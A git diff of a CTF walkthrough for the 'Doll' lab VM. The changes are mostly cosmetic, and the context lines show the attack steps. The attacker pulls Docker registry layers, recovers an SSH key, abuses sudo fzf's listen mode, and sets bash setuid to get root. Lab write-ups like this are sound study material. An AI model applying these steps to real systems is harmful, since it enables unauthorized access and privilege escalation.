@@ -12,9 +12,14 @@
 
 <img src="https://hackmyvm.eu/img/vm/ez.png" alt="Doll Machine Logo" width="150"/>
 
+#### Tools Used
+
+- Gobuster
+- Nmap
+
 #### Machine Writeup
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ifconfig`:
 ```
@@ -117,13 +122,13 @@ Starting gobuster in directory enumeration mode
 ```
 
 <div>
-	<img src="assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
 	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
 </div>
 
 [Pentesting Docker Registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
 
-**#Discovering**
+[**#Discovering**]
 The easiest way to discover this service running is get it on the output of nmap. Anyway, note that as it's a HTTP based service it can be behind HTTP proxies and nmap won't detect it. Some fingerprints:
 - If you access `/` nothing is returned in the response
 - If you access `/v2/` then `{}` is returned
@@ -216,8 +221,7 @@ The easiest way to discover this service running is get it on the output of nmap
 }
 ```
 
-`mkdir ./blobs`
-`cd ./blobs`
+`mkdir ./blobs && cd ./blobs`
 
 `wget http://192.168.56.125:1007/v2/dolly/manifests/latest`:
 ```
@@ -296,7 +300,9 @@ total 3320
 3296 -rw-rw-r--  1 kali kali 3374563 Sep 26 04:27 f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09.gz
    4 -rw-rw-r--  1 kali kali    3476 Sep 26 04:02 latest
 ```
+
 `rm ./a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.1.gz`
+
 `rm ./latest`
 
 `file *`:
@@ -325,7 +331,9 @@ for file in *; do
     fi 
 done
 ```
+
 `chmod +x ./extract_tar_archives.sh`
+
 `./extract_tar_archives.sh`
 
 `ls -alps ./`:
@@ -381,6 +389,7 @@ total 12
 4 drwxrwxr-x 5 kali kali 4096 Sep 26 04:55 ../
 4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 bela/ ←
 ```
+
 `ls -alps ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/`:
 ```
 total 16
@@ -390,6 +399,7 @@ total 16
 4 drwxr-xr-x 2 kali kali 4096 Apr 25  2023 .ssh/ ←
 0 -rwxr-xr-x 1 kali kali    0 Dec 31  1969 .wh..wh..opq
 ```
+
 `ls -alps ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh`:
 ```        
 total 12
@@ -397,6 +407,7 @@ total 12
 4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 ../
 4 -rw-r--r-- 1 kali kali 2635 Apr 25  2023 id_rsa ←
 ```
+
 `chmod 600 ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa`
 
 `ssh -i ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa bela@192.168.56.125`:
@@ -413,7 +424,7 @@ permitted by applicable law.
 Last login: Thu Sep 26 11:09:06 2024 from 192.168.56.118
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>bela</code> }</b></span>
+![Victim: bela](https://img.shields.io/badge/Victim-bela-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -440,6 +451,7 @@ Codename:       bullseye
 ```
 
 `cd /home/bela`
+
 `ls -alps ./`:
 ```
 total 36
@@ -484,7 +496,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 `exit`
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ssh -i ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa bela@192.168.56.125 -L 8888:127.0.0.1:1337`:
 ```
@@ -500,7 +512,7 @@ permitted by applicable law.
 Last login: Thu Sep 26 11:09:17 2024 from 192.168.56.118
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>bela</code> }</b></span>
+![Victim: bela](https://img.shields.io/badge/Victim-bela-64b5f6?logo=linux&logoColor=white)
 
 `sudo /usr/bin/fzf --listen\=1337 &`:
 ```
@@ -514,7 +526,7 @@ Last login: Thu Sep 26 11:09:17 2024 from 192.168.56.118
 tcp        0      0 127.0.0.1:1337 ←         0.0.0.0:*               LISTEN      -
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `lsof -i ":8888"`:
 ```
@@ -600,13 +612,13 @@ unknown action: TEST ←
 ```
 
 <div>
-	<img src="assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
+	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
 	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
 </div>
 
 [fzf](https://github.com/junegunn/fzf?tab=readme-ov-file#executing-external-programs)
 
-**#Executing external programs**
+[**#Executing external programs**]
 You can set up key bindings for starting external processes without leaving fzf (`execute`, `execute-silent`).
 ```shell
 # Press F1 to open the file with less without leaving fzf
@@ -633,7 +645,7 @@ fzf --bind 'f1:execute(less -f {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort
 * Connection #0 to host localhost left intact
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>bela</code> }</b></span>
+![Victim: bela](https://img.shields.io/badge/Victim-bela-64b5f6?logo=linux&logoColor=white)
 
 `ls -l /usr/bin/bash`:
 ```
@@ -642,7 +654,7 @@ fzf --bind 'f1:execute(less -f {}),ctrl-y:execute-silent(echo {} | pbcopy)+abort
 
 `/usr/bin/bash -p`
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>
+![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -655,6 +667,7 @@ uid=1000(bela) gid=1000(bela) euid=0(root) egid=0(root) grupos=0(root),24(cdrom)
 ```
 
 `cd /root`
+
 `ls -alps`:
 ```
 total 32
